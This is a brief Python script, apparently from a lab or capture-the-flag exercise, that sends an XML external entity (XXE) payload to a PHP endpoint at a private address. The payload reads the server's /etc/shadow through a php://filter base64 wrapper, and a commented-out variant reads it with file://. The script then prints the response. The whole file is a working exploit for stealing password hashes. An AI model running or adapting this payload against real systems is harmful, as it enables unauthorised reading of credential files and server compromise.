import requests


#xml = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/shadow">]><root><name></name><tel></tel><email>OUT&xxe;OUT</email></root>'

xml2 = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root [<!ELEMENT root ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">]><root><name></name><tel></tel><email>OUT&xxe;OUT</email></root>'


url = "http://172.16.238.20/process.php"
#req = requests.post(url, data=xml)
#print(req.content)
req = requests.post(url, data=xml2)
print(req.content)
